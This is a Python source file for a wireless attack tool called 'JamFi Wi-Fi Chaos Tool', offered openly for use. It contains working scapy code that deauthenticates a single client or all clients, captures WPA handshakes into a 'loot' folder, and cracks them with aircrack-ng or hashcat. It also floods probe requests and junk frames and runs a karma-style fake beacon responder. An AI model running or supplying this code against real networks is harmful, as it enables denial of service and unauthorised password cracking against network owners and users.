#!/usr/bin/env python3
import os
import sys
import time
import json
from scapy.all import *
from threading import Thread
from random import choice, randint

seen_aps = {}
clients = {}
scan_results = {}

vendor_prefixes = [
    "00:11:22", "00:0C:29", "D8:96:95", "F4:5C:89", "3C:5A:B4",
    "B8:27:EB", "8C:85:90", "40:B0:34", "A4:5E:60", "E0:3F:49"
]

def print_banner():
    print(r"""
     ██╗ █████╗ ███╗   ███╗        ███████╗██╗
     ██║██╔══██╗████╗ ████║        ██╔════╝██║
     ██║███████║██╔████╔██║        █████╗  ██║
██   ██║██╔══██║██║╚██╔╝██║        ██╔══╝  ██║
╚█████╔╝██║  ██║██║ ╚═╝ ██║███████╗██║     ██║
 ╚════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝

        💜  JamFi Wi-Fi Chaos Tool  💜
               by ekoms savior
""")


def channel_hopper(iface):
    while True:
        for ch in range(1, 14):
            os.system(f"iwconfig {iface} channel {ch}")
            time.sleep(0.3)

def packet_handler(pkt):
    if pkt.haslayer(Dot11Beacon):
        bssid = pkt[Dot11].addr3
        ssid = pkt[Dot11Elt].info.decode(errors='ignore') or "<Hidden SSID>"
        if bssid not in seen_aps:
            seen_aps[bssid] = ssid
            scan_results[bssid] = {"ssid": ssid, "clients": []}
            print(f"📶 AP: {ssid:<25} BSSID: {bssid}")
    if pkt.haslayer(Dot11) and pkt.type == 2:
        src = pkt.addr2
        bssid = pkt.addr3
        if bssid in seen_aps and src != bssid and src not in clients:
            clients[src] = bssid
            scan_results[bssid]["clients"].append(src)
            print(f"    💡 Client: {src} -> {seen_aps[bssid]}")

def scan_clients():
    iface = input("💜 Enter monitor mode interface (e.g. wlan0mon): ").strip()
    if not iface:
        print("⚠️ Interface not entered.")
        return
    print("📡 Scanning for clients and APs... (CTRL+C to stop)\n")
    Thread(target=channel_hopper, args=(iface,), daemon=True).start()
    try:
        sniff(iface=iface, prn=packet_handler, store=0)
    except KeyboardInterrupt:
        print("✅ Scan stopped.")

def capture_handshake(iface, bssid):
    os.makedirs("loot", exist_ok=True)
    path = f"loot/handshake_{bssid.replace(':','')}.pcap"
    print(f"📡 Capturing handshake to {bssid}, saving to {path}")
    def eapol(pkt): return pkt.haslayer(EAPOL) and pkt.addr2 == bssid
    pkts = sniff(iface=iface, lfilter=eapol, timeout=60)
    if pkts:
        wrpcap(path, pkts)
        print(f"✅ Saved handshake to {path}")
    else:
        print("⚠️ No handshake captured.")

def deauth_attack():
    iface = input("💜 Monitor mode interface: ").strip()
    target = input("💜 Target Client MAC: ").strip()
    ap = input("💜 Access Point MAC: ").strip()
    count = int(input("💜 Number of packets: ") or 100)
    delay = float(input("💜 Delay between packets: ") or 0.05)
    capture = input("💜 Capture handshake? (y/n): ").strip().lower()
    if capture == "y":
        Thread(target=capture_handshake, args=(iface, ap)).start()
        time.sleep(2)
    frame = RadioTap()/Dot11(addr1=target, addr2=ap, addr3=ap)/Dot11Deauth(reason=7)
    sendp(frame, iface=iface, count=count, inter=delay)
    print("✅ Deauth complete!")

def deauth_all():
    iface = input("💜 Monitor mode interface: ").strip()
    if not scan_results:
        print("⚠️ Run scan first!")
        return
    count = int(input("💜 Number of packets per client (default 100): ") or 100)
    delay = float(input("💜 Delay between packets (default 0.05): ") or 0.05)
    print("💥 Deauthing all clients and sniffing handshakes...\n")
    for bssid, data in scan_results.items():
        Thread(target=capture_handshake, args=(iface, bssid), daemon=True).start()
        for client in data["clients"]:
            frame = RadioTap()/Dot11(addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
            sendp(frame, iface=iface, count=count, inter=delay, verbose=0)
            print(f"🚀 Deauthed {client} from {data['ssid']}")

def crack_handshakes():
    print("\n💜 Choose cracking mode:")
    print("1. Auto-detect handshakes in loot/ folder")
    print("2. Provide path to custom handshake file")
    mode = input("💜 Option: ").strip()

    if mode == "1":
        loot_dir = "loot"
        if not os.path.exists(loot_dir):
            print("⚠️ Loot folder not found.")
            return
        pcaps = [f for f in os.listdir(loot_dir) if f.endswith((".pcap", ".cap", ".hccapx", ".hc22000"))]
        if not pcaps:
            print("⚠️ No handshake files found.")
            return
        for i, p in enumerate(pcaps):
            print(f"{i+1}. {p}")
        try:
            idx = int(input("💜 Choose file number: ")) - 1
            file_path = os.path.join(loot_dir, pcaps[idx])
        except:
            print("⚠️ Invalid selection.")
            return
    elif mode == "2":
        file_path = input("💜 Enter full path to .pcap/.cap/.hccapx/.hc22000: ").strip()
        if not os.path.isfile(file_path):
            print("❌ File not found.")
            return
    else:
        print("⚠️ Invalid mode selected.")
        return

    print("\n💜 Choose tool:")
    print("1. Aircrack-ng")
    print("2. Hashcat")
    tool = input("💜 Option: ").strip()

    wordlist = input("📚 Path to wordlist (default rockyou.txt): ").strip()
    if not wordlist:
        wordlist = "/usr/share/wordlists/rockyou.txt"
    if not os.path.isfile(wordlist):
        print("❌ Wordlist not found!")
        return

    if tool == "1":
        print("✨ Cracking with Aircrack-ng... 🔍")
        os.system(f"aircrack-ng '{file_path}' -w '{wordlist}'")
    elif tool == "2":
        session = "jamfi_session"
        if file_path.endswith(".hccapx"):
            hcx_path = file_path
            mode = 2500
        elif file_path.endswith(".hc22000"):
            hcx_path = file_path
            mode = 22000
        else:
            hcx_path = file_path.rsplit(".", 1)[0] + ".hc22000"
            print(f"🔄 Converting {file_path} to {hcx_path} with hcxpcapngtool...")
            os.system(f"hcxpcapngtool -o '{hcx_path}' '{file_path}'")
            mode = 22000
        print("🐉 Cracking with Hashcat... use Ctrl+C to stop anytime.")
        os.system(f"hashcat -m {mode} '{hcx_path}' '{wordlist}' --force --session {session} --potfile-path jamfi.potfile")
    else:
        print("⚠️ Invalid tool selected.")

def probe_spammer():
    iface = input("💜 Monitor mode interface: ").strip()
    ssids = ["FreeWiFi", "HackThePlanet", "Xfinitywifi", "Starbucks_Guest"]
    count = int(input("💜 Number of probes: ") or 500)
    delay = float(input("💜 Delay: ") or 0.01)
    for _ in range(count):
        ssid = choice(ssids)
        pkt = RadioTap()/Dot11(type=0, subtype=4, addr1="ff:ff:ff:ff:ff:ff",
                addr2=RandMAC(), addr3="ff:ff:ff:ff:ff:ff")/Dot11ProbeReq()/Dot11Elt(ID=0, info=ssid)
        sendp(pkt, iface=iface, verbose=0)
        time.sleep(delay)
    print("✅ Probe spam done!")

def junk_flood():
    iface = input("💜 Monitor mode interface: ").strip()
    count = int(input("💜 Number of packets: ") or 1000)
    delay = float(input("💜 Delay: ") or 0.01)
    types = [0, 4, 5, 8]
    for _ in range(count):
        prefix = choice(vendor_prefixes)
        suffix = ":".join([f"%02x" % randint(0, 255) for _ in range(3)])
        src = f"{prefix}:{suffix}"
        dst = RandMAC()
        subtype = choice(types)
        pkt = RadioTap()/Dot11(type=0, subtype=subtype, addr1=dst,
            addr2=src, addr3=src)/Raw(load=os.urandom(64))
        sendp(pkt, iface=iface, verbose=0)
        time.sleep(delay)
    print("✅ Junk flood complete!")

def karma_responder():
    iface = input("💜 Monitor mode interface: ").strip()
    print("🧲 Listening for probe requests...")
    def respond(pkt):
        if pkt.haslayer(Dot11ProbeReq) and pkt.haslayer(Dot11Elt):
            ssid = pkt[Dot11Elt].info.decode(errors='ignore')
            if ssid:
                beacon = RadioTap()/Dot11(type=0, subtype=8,
                    addr1="ff:ff:ff:ff:ff:ff", addr2=RandMAC(), addr3=RandMAC())/Dot11Beacon()/Dot11Elt(ID=0, info=ssid)
                sendp(beacon, iface=iface, count=1, verbose=0)
                print(f"🧲 Responded to probe for SSID: {ssid}")
    sniff(iface=iface, prn=respond, store=0)

def chaos_mode():
    print("💃 entering CHAOS DANCE MODE 💃")
    iface = input("💜 Monitor mode interface: ").strip()
    end = time.time() + 60
    while time.time() < end:
        probe_spammer()
        junk_flood()
        time.sleep(2)
    print("💥 Chaos mode complete!")

def loot_viewer():
    loot_dir = "loot"
    if not os.path.exists(loot_dir):
        print("⚠️ No loot yet.")
        return
    for f in os.listdir(loot_dir):
        print(f"📁 {f}")

def evil_ap():
    print("👿 Evil AP coming soon! Will mimic target SSID with optional portal.")

def main():
    print_banner()
    while True:
        print("\n🔹 1️⃣  Scan Clients & APs 🔍")
        print("🔹 2️⃣  Deauth One Client 💥")
        print("🔹 3️⃣  Deauth ALL Clients + Capture 🔓")
        print("🔹 4️⃣  Crack Captured Handshakes 🔓")
        print("🔹 5️⃣  Probe Request Spam 📡")
        print("🔹 6️⃣  Junk Packet Flood 💣")
        print("🔹 7️⃣  Karma Responder 🧲")
        print("🔹 8️⃣  Chaos Mode 💃")
        print("🔹 9️⃣  View Loot 📁")
        print("🔹 🔟  Evil AP 👿")
        print("🔹 0️⃣  Quit ❌")
        choice = input("💜 Choose an option: ").strip()

        if choice == "1": scan_clients()
        elif choice == "2": deauth_attack()
        elif choice == "3": deauth_all()
        elif choice == "4": crack_handshakes()
        elif choice == "5": probe_spammer()
        elif choice == "6": junk_flood()
        elif choice == "7": karma_responder()
        elif choice == "8": chaos_mode()
        elif choice == "9": loot_viewer()
        elif choice == "10": evil_ap()
        elif choice == "0":
            print("👋 Goodbye fren! XOXOXO 💜")
            sys.exit()
        else:
            print("⚠️ Invalid choice!")

if __name__ == "__main__":
    main()
